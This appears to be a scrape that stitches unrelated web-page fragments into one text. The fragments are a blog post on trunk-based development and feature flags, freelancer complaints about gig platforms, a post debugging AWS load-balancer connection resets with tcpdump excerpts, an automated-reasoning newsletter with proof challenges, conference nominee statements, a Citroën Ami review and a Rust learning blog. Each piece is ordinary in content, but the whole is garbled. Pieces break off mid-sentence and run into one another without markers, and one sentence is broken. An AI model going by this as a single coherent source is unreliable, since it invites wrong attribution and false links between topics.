only “partially implemented”:</p></li>
</ul>


<figure>
    
        <img src="https://ourmachinery.com/images/step__trunk-based-development.png">
    
    
    <figcaption>
        <h4>Trunk-based vs feature branch development.</h4>
        
    </figcaption>
    
</figure>


<p>Proponents of the feature branch approach claim that it is a safer way to work since changes to the
feature branch don’t disrupt the master and cause bugs. Personally, I think this safety is illusory.
Bugs in the feature branch just get hidden until it’s merged back to master when we suddenly get
<em>all</em> the bugs.</p>

<p>Feature branches also go against my philosophy that every commit should add value. The whole idea
behind a feature branch is: “we’re going to break a bunch of shit over here, but don’t worry, we’ll
fix it before we merge back to master”. Better not to break stuff in the first place.</p>

<p>Here are some other advantages I see with the trunk-based approach:</p>

<ul>
<li><p><strong>Fewer merge conflicts.</strong> With long-running feature branches, the code in the branch drifts
further and further away from the code in master, causing more and more merge conflicts. Dealing
with these is a lot of busy work for programmers and it also risks introducing bugs. Some of these
bugs won’t be seen until the branch is merged.</p></li>

<li><p><strong>Less release-day chaos.</strong> Typically, all features scheduled for a certain release have the same
deadline. This leads to all feature branches being merged just before the deadline. This means
that we get all the merge and integration bugs at the same time, just before the release date.
Getting a lot of bugs at the same time is a lot worse than having them spread out evenly. And
getting them just before a release is due is the absolute worst time to get them.</p></li>

<li><p><strong>No worry about the right time to merge.</strong> Since everybody knows that merging a feature branch
tends to cause instability, this leads to worry about the “right time” to merge. You want to avoid
merging right before a release (unless the feature is required for the release) to avoid
introducing bugs in the release. So maybe just after the release has been made? But what if we
need a hotfix for the release? While the merge is being held, valuable programmer time is being
wasted.</p></li>

<li><p><strong>No rush to merge.</strong> When working with feature branches, I often felt a hurriedness about getting
the branches merged. Sometimes because a branch was needed for a specific release. But also often
because the developer was tired of dealing with merge conflicts, wanted to get it over with, and
move on to the next thing. Thus, the goal of only merging feature branches when they are
“complete” was often compromised. (And of course, nothing is ever really “complete”.)</p></li>

<li><p><strong>Easier to revert.</strong> If major issues are discovered after the merge of a feature branch (which
often happens), there is often a lot of reluctance to revert the merge. Another big feature branch
might already have been merged on top of it (since lots of feature branches often get merged at
the same time, just before a release), and reverting it would cause total merge chaos. So instead
of doing a calm, sensible rollback, the team has to scramble desperately to fix the issues before
the release. With trunk-based development, any major issues would most likely have already been
discovered. The final commit that makes the new feature “go live” is typically a simple one-line
change that is painless to revert.</p></li>

<li><p><strong>Partial work is shared.</strong> In trunk-based development, the partial work done on a feature is seen
by all developers (in the master branch). Thus, everybody has a good idea of where the engine is
going. Bugs, design flaws, and other issues can be discovered early. And it is easier for others
to adapt their code to work with the new feature. It’s also easier to get an estimate of how much
work is needed to complete a feature when everybody can see how far it has progressed.</p></li>

<li><p><strong>Easier to pause and pick up later.</strong> Sometimes, work on a feature might have to be paused for a
variety of reasons. There might be more critical issues that need to be addressed. Or the main
developer of the feature might get sick, or have vacation coming up. This is a problem for feature
branches because they tend to “rot” over time, as the code base drifts further and further away,
causing more and more merge conflicts with the branch. Code that is checked into master does not
“rot” in the same way.</p></li>

<li><p><strong>Easier to address other bugs/refactors at the same time.</strong> When working on a feature or a
problem, it is pretty common to find other, related problems, exposed by the work you are doing.
In the trunk-based approach, this is not an issue. You would just make one or more separate
commits to the trunk to fix those issues. With the feature branch approach, it is more tricky. I
guess the <em>right</em> thing to do would be to branch off a new separate bug fix branch from master,
fix the issue in that branch, merge <em>that</em> branch into the branch you are currently working on,
and (once it passes code review) into master (so that other people get the bug fix before your
feature branch is merged, because who knows when that will happen). But who has time for all that
shit? So instead, people just fix the problem in their feature branch, and maybe cherry-pick it
into master if they’re having a good day. So now, instead of being about a single isolated
feature, the feature branch becomes a tangled mix of different features, bug fixes, and refactors.</p></li>
</ul>

<p>The main challenge of the trunk-based approach is how to break a big task down into individual
pieces. Especially, with the requirement that each piece should compile, run, add value, and be
ready to be pushed into master. How can we push partial work without exposing users to half-baked,
not yet fully working features?</p>

<p>Let’s look at some problems and how to solve them.</p>

<h2 id="problem-1-new-features">Problem #1: New features</h2>

<p>An approach that works well for new features is to use a flag to control whether a feature is
visible to end-users or not.</p>

<p>Let’s look at an example. A feature that I recently added to the engine was a <em>Download</em> tab that
lets the users download new engine versions and sample projects from within the engine itself:</p>


<figure>
    
        <img src="https://ourmachinery.com/images/step__download-tab.png">
    
    
    <figcaption>
        <h4>Download tab.</h4>
        
    </figcaption>
    
</figure>


<p>There are lots of different ways this could be broken down into smaller steps. Here’s an example:</p>

<ul>
<li>Add the <em>Download</em> tab to the menus and show a new blank tab when it’s opened.</li>
<li>Show a (hard-coded) list of things to download (without working download buttons).</li>
<li>Download the list of files from a server instead of having it hard-coded.</li>
<li>Implement the <code>[Get]</code> button by synchronously downloading the file when it’s clicked.</li>
<li>Switch to asynchronous, background downloading.</li>
<li>Show a progress bar for the download.</li>
<li>…</li>
</ul>

<p>Normally, I don’t do a full breakdown like this upfront. Instead, I just kind of figure out the next
logical step as I go along. I only sit down and do a serious planning session if the task is
particularly tricky and incremental steps like this don’t come naturally.</p>

<p>To prevent end-users from seeing the tab before it’s actually working, I hide it behind a flag. This
can be as simple as:</p>

<pre><code>const bool download_tab_enabled = false;

// ...

if (download_tab_enabled) {
    add_menu_item(tabs, "Download", open_download_tab);
}
</code></pre>

<p>To get the menu option to show the <em>Download</em> tab, you have to change the <code>download_tab_enabled</code>
flag to <code>true</code> and recompile.</p>

<p>We call these flags <a href="https://en.wikipedia.org/wiki/Feature_toggle"><em>feature flags</em></a> since they
selectively enable or disable …</p></section></div>

					<p>Hello,</p>
<p>Thank you for the post, I felt heard!<br>
I am a bilingual translator. I am not active on Fiverr, but I have just had a similarly awful experience with Peopleperhour. It wasn’t the first nasty experience with their customer-non-service and bullies/clients.</p>
<p>I am amazed by the shortsightedness and greed of the site hosts. What makes these platforms successful are the sellers, not the buyers. Honest, hardworking sellers who provide quality work and services are penalized, vetted with vengeance, but sellers measures are lax and sloppy.</p>
<p>I am stumped by negative reviews on all the freelance platforms. It makes you wonder where you can get fair work as a freelancer. Where to go next?</p>

					<p>I can add that the same seller/buyer disparity exists on eBay too. I’ve been an eBay member for 17 years and my experience of the site as a buyer was overwhelmingly positive, so I didn’t think twice about selling a couple of items on there just before Christmas. HUGE MISTAKE. Despite two of my buyers being clearly in the wrong *one with written evidence saying that the items broke in their possession* eBay still found in their favour and even charged me for the cost of them returning items to me. It cost me £20 and I was left with a broken item that I obviously couldn’t then resell (plus the email stating that it worked when they received it – kicker). </p>
<p>As a seller it was almost impossible to get hold of eBay …</p></div></article></li></ol></div></div></div></div></div></div></div></div></section></div></div></div></div></div></div>

  <article>
    <p>One of my services was running into timeouts, because connections were being reset by clients. 
I had assumed that it couldn’t be the <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html">Network Load Balancers (NLBs)</a> fault, a battle-tested piece in the cloud stack.
The following is about NLBs, cross-zone-loadbalancing and multiple NLBs pointing to the same set of EC2 instances and how that revealed unexpected behaviour in the NLB.</p>

<p><strong>TLDR</strong>: If you don’t want timeouts or connection resets, then:</p>
<ul>
  <li>don’t use cross-zone loadbalancing</li>
  <li>don’t have multiple NLBs pointing at the same targets</li>
  <li>don’t use a public IPv4 address and an NLB for the same target</li>
</ul>

<h2 id="the-symptom-timeouts">The symptom: Timeouts</h2>

<p>My system was doing lots of requests to two NLBs over the internet.
Unfortunately in quite some cases there were timeouts in the application code.
The timeouts were quite aggressive at 1 second. Since a normal packet loss during connecting usually takes 3 seconds before a retry on linux, 
I initially explained it away as naturally occurring packet loss. 
But the number of failures grew ever higher with the link not even close to being saturated and other calls to external targets being fine.</p>

<p>When I finally got myself to take tcpdumps of the traffic, something strange emerged: TCP RST packets.</p>

<h2 id="the-setup-simplified">The Setup (simplified)</h2>

<p>The configuration in which these issues actually surfaced had multiple machines behind a NAT, talking to multiple EC2 instances behind two NLBs with cross-zone-loadbalancing enabled.</p>

<p>But that’s the messy reality, let’s keep it simple for this article. In the following let’s have 1 client, 1 NLB and 1 EC2 instance, because the issue would still be the same.
The NLB has cross-zone loadbalancing enabled.
<img src="https://www.niels-ole.com/assets/2020/nlb-basic.png" alt="An example of IPs used in the requests to an NLB"></p>

<h2 id="background">Background</h2>
<p>In TCP, connections are identified by the quadruple of source ip, source port, target ip and target port.
When you create a new TCP connection, it is made sure that no other connection with the same quadruple is in use.</p>

<h2 id="the-problem">The problem</h2>

<p>(Fast forward a couple of days of staring at tcpdump and head-scratching) 
Here is an excerpt of tcpdump as the client sees it, with all the noise removed:</p>

<div><div><pre><code>Format clientip:clientport &lt;-&gt; targetip:targetport (so a bit different than it looks in wireshark) 
... This connection has been established for some time
90.63.58.20:36230 &lt;- 34.242.162.234:443 Seq=1234 Ack=5432   [ACK]
</code></pre></div></div>

<p>EC2 instance (private IP) says through the NLB (34.242.162.234) to the client (90.63.58.20): <em>Hey, I just received your data, all is good.
This connection is healthy and sending data. Everything as expected.</em> 
Now our client wants to make a new connection and sends a SYN packet.</p>

<div><div><pre><code>90.63.58.20:36230 -&gt; 18.203.64.15:443   Seq=6951            [SYN]
</code></pre></div></div>

<p>As you notice, the source ports are identical, but this is fine, as the target IPs are different.
Next in the 3-way handshake of TCP we would expect a <code>[SYN,ACK]</code> with <code>Ack=6952</code></p>

<div><div><pre><code>90.63.58.20:36230 &lt;- 18.203.64.15:443 Seq=1234  Ack=5432    [ACK], window reduced
</code></pre></div></div>

<p>This packet has the same quadruple, but it isn’t our <code>[SYN,ACK]</code>… wait a sec. Where is this coming from? Does this ack belong on the other connection that the client had with <code>34.242.162.234</code>!?
The Ack numbers match, but that can’t be, can it?</p>

<p><img src="https://www.niels-ole.com/assets/2020/whatthehell.gif" alt="I was thinking: &quot;What the hell&quot;"></p>

<div><div><pre><code>90.63.58.20:36230 -&gt; 18.203.64.15:443 Seq=5432              [RST] 
</code></pre></div></div>
<p>Well, at least the client is as confused as I am and sends an RST. It just sucks that this means our SYN will never be properly answered.</p>

<p>Is the SYN of the new connection overwriting an existing connection in the NLB’s connection table?</p>

<h2 id="the-cause">The cause</h2>

<p>Since I had so much trust in AWS NLBs I first assumed the issue to lie somewhere (anywhere) else. 
I imagined it could theoretically be a faulty switch or a misconfigured NAT gateway on the client side.
But it turned out to be neither of them. It was actually the AWS NLB mixing up the connections.
How can this happen?</p>

<h3 id="cross-az-loadbalancing">Cross AZ-loadbalancing</h3>

<p>When the traffic goes through the NLBs the target IP address get rewritten to the internal IP address of the EC2 instance.</p>

<p><img src="https://www.niels-ole.com/assets/2020/nlb-basic.png" alt="An example of IPs used in the requests to an NLB"></p>

<p>Now how would it look from the client if three connections are created in a round-robin fashion?</p>

<div><div><pre><code>90.63.58.20:20536;34.242.162.234:443
90.63.58.20:36895;18.203.64.15:443
90.63.58.20:60356;52.203.250.3:443
</code></pre></div></div>

<p>Now this looks unproblematic, nice quadruples - no RST packets.
But what happens if we have more and longer-lived connections? Could collisions happen?</p>

<div><div><pre><code>...
90.63.58.20:36230;34.242.162.234:443 let's call this connection A
...
90.63.58.20:36230;18.203.64.15:443   and this one B
...
</code></pre></div></div>

<p>As I said in the background, the kernel ensures that there are no quadruple collisions.
And this is still the case in this case. The same source port can be reused, as long as the target ip or port are different. 
As the connections go to different IPs of the NLB, this is the case… but only from the view of the client.
In the NLB the addresses are translated to an internal IP.
So on the EC2 instance the quadruples look like this:</p>

<div><div><pre><code>...
90.63.58.20:36230;10.54.1.1:443 A
...
90.63.58.20:36230;10.54.1.1:443 B
...
</code></pre></div></div>

<p>Now this looks problematic. Two TCP connections share the same quadruple.
Thus the NLB cannot distinguish between them and sends the packets on either of them.</p>

<h2 id="is-this-a-bug">Is this a bug?</h2>

<p>An ordinary NAT would handle such collisions just fine. 
When a collision is detected, not only the address is translated but also the port.
This makes it possible to handle the complete port range before collisions occur.
NLBs apparently don’t act like NATs. I couldn’t find this spelled out anywhere, but apparently they always preserve the source port. 
This basically means that whenever a client makes more than <em>one</em> connection to the NLB, collisions may occur.
During my research I found out I am <a href="https://medium.com/swlh/nlb-connection-resets-109720accfc6">not the only one irritated by that</a> and that they opened a support ticket and got the confirmation that this is indeed intended behaviour.</p>

<p>In any case I don’t think anyone would derive this from <em>just</em> the docs and TCP knowledge.
There should at least be a big warning sign in <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/userguide/how-elastic-load-balancing-works.html">the documentation</a>.</p>

<h2 id="what-to-do-now">What to do now?</h2>

<p>This issue not only occurs with cross-zone-loadbalancing, but any time two external IPv4-addresses point to the same EC2 instance in AWS.
This includes multiple NLBs pointing at the same target or an instance having both a public IPv4 address and being behind an NLB.</p>

<p>What I take away from this is to never have two NLBs pointed at the same target groups as well as to turn cross-az loadbalancing off for most use-cases.
And never assume that a part of your stack is infallible.</p>

<h2 id="wos">From the AAR President, Larry Wos...</h2>


<p>I was surprised and indeed delighted by the response to the challenge,  
posed in an earlier newsletter, concerning the Rezus-style formula.
That challenge asked one to find a proof of the given Rezus formula  
with an automated reasoning program.
Among others, G. Sutcliffe and J. Halleck succeeded nicely.
Further, in the context of research, Halleck formulated a new approach  
to attacking such problems.
Moreover, the challenge sparked a sequence of e-mail messages, still  
continuing, that brought into play numerous comments from Rezus himself.
In other words, our newsletter caused much profitable interchange  
among logicians and computer scientists.

</p><p>Perhaps the following two types of challenge will have a similar effect.

</p><p>The first challenge focuses on proof finding with an automated  
reasoning program.
For total clarity (in response to some of the recent e-mail messages),  
the key is automation, even if a proof exists in the literature.
The underlying paradigm, especially for those new to the field,  
asserts that progress of a general nature can result from (1) finding  
a theorem that is currently outside the power offered by the program  
in use and (2) devising a strategy or approach to find a proof.
For real progress to occur, however, the new strategy or approach must  
not be tailored to the specific theorem; instead, it must offer  
generality.

</p><p>The theorem to be proved in this first challenge comes from classical  
propositional calculus.
Where the function i denotes implication and the function n denotes  
negation, the following three clauses provide a well-known axiom system.

</p><pre>%  Luka 1 2 3.
P(i(i(x,y),i(i(y,z),i(x,z)))).
P(i(i(n(x),x),x)).
P(i(x,i(n(x),y))).
</pre>

<p>The challenge is to prove from the three clauses the following formula  
expressed in clause notation, a formula that is a member of yet  
another three-axiom system for this logic.

</p><pre>P(i(i(x,i(n(y),z)),i(x,i(i(u,z),i(i(y,u),z))))).  %  thesis 60
</pre>

<p>If you would enjoy a slightly less difficult theorem to first attempt  
to prove with your program, the following suffices, a formula known as  
Frege.

</p><pre>P(i(i(x,i(y,z)),i(i(x,y),i(x,z)))).  % thesis 35
</pre>

<p>The Frege formula is also a member of an axiom system for classical  
propositional calculus.

</p><p>The second promised challenge focuses on a programming project.
The automated reasoning programs with which I am familiar do not,  
during the run, modify themselves.
The challenge, then, is to provide such a capability to a reasoning  
program (of course, I would especially welcome its implementation in  
OTTER).

</p><p>As one example, I suggest an enhancement that extends the spirit of  
the set of support strategy to level 2 and higher.
With the focus on level-2 clauses, when a clause of level-2 is  
deduced, it is adjoined to the set of support list if and only if at  
least one of its parents is a member of the initial set of support.
If none of its parents is a member of the initial set of support and  
if the clause is to be retained, it is immediately placed on  
list(usable) (for OTTER), and the newly retained clause is not allowed  
to initiate paths of reasoning.

</p><p>If the proposed enhancement is implemented in the reasoning program  
and applied to level 3 and beyond, then clearly the levels will not  
grow so dramatically.

</p><p>One of the side effects of this enhancement is the increase, in a  
practical sense, in the use of a breadth-first (level-saturation)  
approach; indeed, a breadth-first search is far more usable if the  
size of the levels increases slowly.

</p><p>Of course, the proposed enhancement increases the likelihood that all  
paths to reaching the goal are blocked.

enhancements, you might visit my

</p><h3 id="fb">Nominee Statement of <a href="http://lat.inf.tu-dresden.de/~baader/index-en.html">Franz Baader</a></h3>
<p>CADE is the major forum for discussing all aspects of automated
reasoning research (theory, implementation, and applications). While
theoretical work and work on implementations are very well represented
at CADE (through regular papers, system descriptions, and the system
competition), we must continue our work on attracting more papers on
applications, which are now often published at conferences related to
the application area (like CAV, KR).

</p><p>In order to ensure the role of CADE as the flagship of automated
reasoning, we must try both to keep the high scientific standards of
the conference and to attract more automated reasoning-related
research from other areas (like knowledge representation, constraint
solving, verification, and computer algebra). Another important point
is to avoid a fragmentation of the field into many small and
specialized subcommunities with their own small conferences and
workshops. This does not mean that I am against having these smaller
events as well. But there should be one big event (every 2-3 years)
where the whole automated reasoning community meets and with which it
identifies. For this reason, while I was CADE president, I have worked
hard to put the IJCAR series on a stable basis (e.g., by establishing
a permanent IJCAR steering committee, participating in the formulation
of the "IJCAR rules") and to ensure participation of IJCAR within the
FLoC conferences (e.g., trying to make their schedules compatible:
IJCAR every two years, alternating with CADE; FLoC every four years).
Unfortunately, there are now again discussions within FLoC about
changing this schedule, and the CADE trustees should try to have a
voice in this discussion to ensure that CADE's and IJCAR's interests
are not ignored by FLoC. 

</p><h3 id="cb">Nominee Statement of <a href="http://www.cs.nyu.edu/~barrett/">Clark Barrett</a></h3> 
<p>This is a very exciting time for automated deduction and the CADE
conference!  With the ongoing advances both in theory and in computing
power, automated deduction is emerging from a niche field to become a
powerful enabling technology for a wide variety of applications.  As a
community, I believe we have a message to get out which is that
automated deduction has arrived!  It can solve real problems — and we've
only just scratched the surface in terms of finding applications.  As a
trustee I would like part of my focus to be on spreading this message by
looking for new connections and applications and finding ways to involve
people working in these areas in CADE.  At the same time, CADE is
already a thriving community with many fine traditions and great
intellectual resources.  The other part of my focus would be simply to
reinforce its current strengths, to make sure the conference continues
to thrive, and to ensure it provides a welcoming environment for bright
minds new and old. 


</p><h3 id="af">Nominee Statement of <a href="http://www.site.uottawa.ca/~afelty/">Amy Felty</a></h3> 
<p>There is currently a lot of diversity in our field which helps make
for interesting and fruitful conferences, including both CADE and
IJCAR.  The IJCAR initiative has been quite successful, and I strongly
support its continuation, as well as continuing participation in FLoC,
which provides an excellent way to bring together many people in
related but diverse areas.  I also strongly support CADE's role in
supporting student participation, particularly through the Bledsoe
Travel Award.  Another strong point of CADE/IJCAR is the associated
workshops, which provide the …</p></div>

Citroën's tiny electric 'citadine' is smart, innovative, and well-designed. Seeing the first press cars zip through the wide boulevards of Paris brought a big smile to my face. But the more I kept thinking about it, the more I started to doubt the purpose of this car. </p>

<p>The Ami started life as the AMI ONE C Concept which was a study on new ways to overcome the challenges of designing a small, affordable city car. The two biggest challenges are how to create as much interior space as possible and how to keep the production costs low. Many of the ideas of the concept car have found their way to the Ami production model.</p>

<h2>Cost Saving</h2>
<p>The 'usual' cost-saving recipe when creating affordable city cars is to share a production line with other manufacturers. The drawback is that these manufacturers are selling the same car with slightly different design details. </p>

    <figcaption>The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line</figcaption>
  </figure>
<p>Citroën took a different approach. Instead of sharing a production line, they have come up with ways to create the simplest production line. This limits the variety of the design but instead of trying to hide that, the Ami highlights these limitations.
The clearest example is the exterior bodywork. As you can see from the video below, the exterior is largely made up of only three different bodywork panels.</p>

</video> 
<p>This gives it its quirky look as from far away the car does not seem to have a clear front or backside. The doors have a similar effect. Because they are identical,  they open in opposite directions from each other. Instead of trying to hide these limitations, Citroën shows them off in ads and commercials, celebrating the quirkiness of the car.</p>

<p>Citroën was also inspired by the father of mass production, the Ford Model T. Like the Model T, the Ami is only available in one color. Personalization is important to many customers though. So Citroën came up with different sticker sets that the customer can use to personalize the car.</p>

<p>This smart design philosophy continues in the interior. For example, the side windows are not electric but hinge outward. Citroën like to point out that this was inspired by the 2CV, the spiritual father of the Ami, turning it into a nostalgic feature instead of a limitation. </p>

<p>A big challenge for car companies today is that customers want more expensive technology to be available in the car. The adoption rate of new smartphones is high and customers expect the same level of innovation in their cars. For a cheap city car, it is impossible to provide this.
That is why the Ami does not have a center console but instead, a big smartphone mount. Like this, the Ami leverages the driver's smartphone to offer the same features as premium cars without the cost. Similarly, the car has no speakers. Instead, there is an opening in the dashboard designed to hold a Bluetooth speaker.</p>

<h2>Interior Space</h2>
<p>Creating a lot of interior space is a huge challenge for small city cars. Thanks to Ami's electric drivetrain, the space that is otherwise used to house the engine, gearbox, and other mechanical parts can now be used for the interior. It also means that the wheels can be placed at the outer edges of the car which not only gives it a tiny turning circle, it also maximizes the interior space. </p>
<p>The many windows of the car allow for a lot of natural light to enter the cabin which helps in making the interior feel big.
Entering the vehicle for the first time feels unreal. The car is much smaller than any other vehicle on the road. With its length of 2.41m and width of 1.29m, it is significantly smaller than a Smart Fortwo (2.69m x 1.66m). But when entering the car, the interior feels so spacious that it seems bigger than the car itself!</p>
<p>Clearly, the Ami is not meant for going on vacation so it does not need to have a big amount of storage space. It does manage to have enough interior space for the things you would bring on short trips.
Due to the packaging of the car, the dashboard reaches quite far to the front of the car. In it, there are different patterns and holders for small items like a water bottle or sunglasses. </p>

<p>An idea that directly comes from concept car is to place the passenger seat a bit further back than the driver's seat which creates a space for a backpack in the passenger's footwell.</p>

<p>Driving the Ami around Paris, it feels more like a scooter than a car. Thanks to the many windows, you feel more exposed and connected to other road users. It is easier to make eye contact and communicate with cyclists and pedestrians so it is a much friendlier vehicle than a regular car.
Despite the cheap materials, the interior is not an unpleasant place to be. By cleverly creating space and a place for the smartphone, it provides everything you might need for a short trip. It is hard not to love it!</p>

<p>Citroën has intended the Ami to be a car for the (urban) masses and is trying to give anyone a reason to use one. It is available to buy for around 6000 euros or rent for 20 euros per month after a down payment. Additionally, several car-sharing services will include the Ami in their fleet. It is not only available at Citroën dealerships, but also in France's big electronics retailers Fnac and Darty. </p>

<p>It has a top speed of 45km/h, it can do 75km on a full charge and it takes only 3 hours to charge it in a normal 220v household plug. It is classified as a quadricycle, not a car, so anyone over 14 can legally drive the car in France without a license. </p>
<p>Citroën did not design the car for a specific target audience. But the company does want to tap into the market of families. Citroën expects that almost half of the drivers will be younger than 18. They argue that parents will prefer to have their teenage children race around the city in a vehicle that is much safer than scooters or bicycles. The price of a monthly subscription is similar to a public transportation card or scooter subscription making it an attractive alternative.
The first signs are clearly positive as there are currently waiting lines to test drive one. </p>

<p>So far so good then. The Ami is cheap, well-designed, eco-friendly, and accessible to most of the public. What is not to love? To understand my concerns, we have to dive back in time and look at the bigger picture of city transportation.</p>
<h2>A History Lesson</h2>
<p>Before cars were the main mode of transport, city streets were a place where children played football, where neighbors would run into each other and stop for a chat. They were a place where people spent time and socialized. But at some point, something changed. Paris was one of the first cities where this happened. Between 1853 and 1870 Baron Haussman transformed much of the medieval city center of Paris into a 'healthy' city. This involved tearing down much of the narrow streets to make place for wide boulevards. </p>

<p>The side effect was that it allowed horse-drawn carriages to go much faster, resulting in louder, more dangerous streets.
Before, pedestrians ruled the streets and other forms of transportation had to adjust to them. After the transformation though, the wide boulevards switched this around. Check this video from 1890 where this is clearly visible:</p>
<p><iframe src="https://www.youtube.com/embed/fo_eZuOTBNc?start=107" allowfullscreen=""></iframe></p>
<p>After the Second World War, this became even worse when cars were seen as the future of personal transportation. The modernist movement turned entire city centers into highways and parking lots. Suddenly, city streets were not a social place, they were there to get traffic from A to B as quickly and efficiently as possible. Pedestrians, despite being in the majority, were delegated to narrow sidewalks, jaywalking became an offense, and most of the public space was allocated to driving or parking. </p>

<p>With the rising importance of global climate change and more recently, the Covid crisis, cities are realizing that the current solution is unsustainable.
A country where this realization has happened a few decades ago is the Netherlands. Like other countries in the '60s, Dutch cities were moving towards car-centric infrastructure. There were plans to destroy much of the historic center of Amsterdam to make way for …</p></div></div>

It focuses closely on the type system, and the key insights I needed to begin "thinking in Rust".

<p><em>Although originally conceived as part 2 of 2, this can be read as a standalone entry.

<h2 id="my-first-date-with-rust---know-thy-enemy">My First Date with Rust - Know Thy Enemy</h2>
<p>As a working programmer with several mainstream languages under your belt (eg <code>Java</code>, <code>C#</code>, <code>javascript</code>, <code>python</code>, etc) it's reasonable to expect that after a bit of orientation with quirks and syntax you'll find yourself somewhat productive. If you know Rust you won't be surprised when I say my experience was... humbling. </p>
<p>The last time I felt so dumb was probably more than a decade ago, as a novice programmer teaching myself Object Orientated Programming (OOP). I think that's the point, new paradigms require effort to build a working mental model for. And depending on where you start on the ladder you might have quite a lot of mental rebuilding to do.  </p>
<p>Rust intentionally tries to be "boring". That is to say, its DNA borrows liberally from prior art. If you're familiar with manual memory management (<code>C</code>, <code>C++</code>, <code>Obj-C</code>) you'll probably understand pointers in Rust. If you're familiar with functional languages (<code>Haskell</code>, <code>Elm</code>, <code>Clojure</code>, <code>OCaml</code>) you'll have an immediate start recognising the type system. The reason it aims for boring is because it spends its entire novelty budget on the one unique idea: automatic scope based memory allocation (aka the borrow checker). This is the knockout feature: <strong>the performance of C with the safety of garbage collected languages.</strong></p>
<p><a href="http://intorust.com/" target="_blank" rel="nofollow noopener noreferrer">Plenty</a> <a href="https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html" target="_blank" rel="nofollow noopener noreferrer">of ink</a> <a href="https://squidarth.com/rc/rust/2018/05/31/rust-borrowing-and-ownership.html" target="_blank" rel="nofollow noopener noreferrer">has been</a> <a href="https://dev.to/strottos/learn-rust-the-hard-bits-3d26" target="_blank" rel="nofollow noopener noreferrer">written</a> about ownership and the borrow checker. It follows the most unprecedented feature would have the most said about it. There seems to be a common refrain: "<em>It's really hard at first, but stick with it. You'll see, it changes everything</em>". Sounds suspiciously like Vim or Emacs users (please don't fight me). Is it the promised land or just a severe case of Stockholm syndrome?     </p>
<p>Nevertheless, extensive reading had prepared me to expect a big ol' messy fight with the borrow checker. We did tussle, but it went better than expected. Ironically, after years of <code>C#</code> game development, performance concerns have taught me much of the internal dialogue needed to reason about memory lifetimes: "Is this allocated on the stack or heap? Is this going to create allocation (garbage collection) pressure? Is this copying data or mutating it in place?"</p>
<p>In this sense, when the borrow checker complained I could at least appreciate what it was trying to protect me against. And as to be expected, it may be a while yet before I fully grok lifetimes. Controversially though, "Rust's expressive type system" put up a stiffer fight than I anticipated.</p>
<h2 id="stubbing-toes-on-functional-programming">Stubbing Toes on Functional Programming</h2>
<p>Before anyone grabs a pitchfork, this isn't a rant about the unnecessary burden of type systems. Throughout my career, I've favoured statically and strongly typed programming languages. I believe in correctness, and tooling should help you get there. It's why Rust excites me.</p>
<p>Taken to its ultimate conclusion, one arrives at <code>Haskell</code> and other pure functional programming (FP) languages. FP's conceit is trading performance for correctness. As a concerned game developer, this never felt like a bargain I could entertain. Not that it's prevented FP idioms from seeping into the groundwater of other programming languages (see <code>LINQ</code> in <code>C#</code> or <code>map() filter() reduce()</code> in <code>javascript</code> as examples).   </p>
<p>You can see signs of this functional DNA written all over Rust too, immutability by default being the most obvious. However, Rust strikes a wonderfully pragmatic balance. Imperative programming is not outlawed, and many escape hatches exist. Rust is, as far as I'm aware, <strong>the first language that allows you to deploy functional concepts as zero-cost abstractions</strong>. If the borrow checker is the obvious hit single, this is the real album sleeper hit. </p>
<p>I think my undoing was simply that I had a false expectation of equivalence. I'm confident in my type literacy and I can, if we must, talk in-depth about Java design patterns. I've never courted a "proper" functional language, but I recognise their influence. I understood "expressive type system" to be a superset of what I already know. In some respects it is, but in others, it was fundamentally different. I want to share some of my "aha" moments because I haven't seen much written with this lens...  </p>
<h2 id="use-rust-analyzer">Use Rust Analyzer!</h2>
<p>To anyone following my footsteps: <strong>setup your dev environment for code intelligence and type hints</strong> is my best advice. I intentionally offer it here before any code samples make you glaze over and miss it.  </p>
<p><img src="https://thefuntastic.com/blog/2020-10-Rust-Analyser.png" title="Screenshot of Rust Analyser extension in Visual Studio extensions gallery"></p>
<p>At the time of writing (Oct 2020), I found Visual Studio Code with the <a href="https://marketplace.visualstudio.com/items?itemName=matklad.rust-analyzer" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a> extension to be the most reliable path. I learnt this only after naively installing the <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust" target="_blank" rel="nofollow noopener noreferrer"><code>Rust</code></a> extension, which provides a front end for both the earlier <a href="https://github.com/rust-lang/rls" target="_blank" rel="nofollow noopener noreferrer"><code>RLS</code></a> and the more modern <a href="https://rust-analyzer.github.io/" target="_blank" rel="nofollow noopener noreferrer"><code>rust-analyzer</code></a>. However, in my experience, the native <code>rust-analyzer</code> extension was vastly superior.</p>

<p>If you can express something as a type, the compiler can offer you guarantees about it. An expressive type system allows you to model domains that weren't possible before, often using simpler machinery too. Rust takes this affordance and runs with it. Types are used for everything, and I do mean <strong>everything</strong>. A lot of problems didn't quite make sense until I learnt to recognise them for what they were: type errors. </p>
<p>However, starting out, there are a few obvious differences I'd put into the "quirks" category. They seem foreign and strange, but acclimatisation comes quickly. I'll only briefly touch on them for those who've never seen Rust before. Exhaustive coverage exists in <a href="https://doc.rust-lang.org/book/ch05-00-structs.html" target="_blank" rel="nofollow noopener noreferrer">the Rust book</a> and <a href="https://fasterthanli.me/articles/i-am-a-java-csharp-c-or-cplusplus-dev-time-to-do-some-rust" target="_blank" rel="nofollow noopener noreferrer">elsewhere</a>.</p>
<p><strong> Rust doesn't have <code>classes</code> and only uses <code>structs</code>:</strong>   </p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>  </pre>
<p><em>"Cool cool. Structs are kinda like classes anyway"</em></p>
<p><strong>Methods are defined in <code>impl</code> blocks instead of the <code>struct</code> definition: </strong></p>
<pre><span>pub</span> <span>struct</span> <span>MyData</span> <span>{</span>
    <span>pub</span> x<span>:</span> <span>f32</span><span>,</span> 
    <span>pub</span> y<span>:</span> <span>f32</span><span>,</span>
    <span>pub</span> z<span>:</span> <span>f32</span>
<span>}</span>

<span>impl</span> <span>MyData</span> <span>{</span>

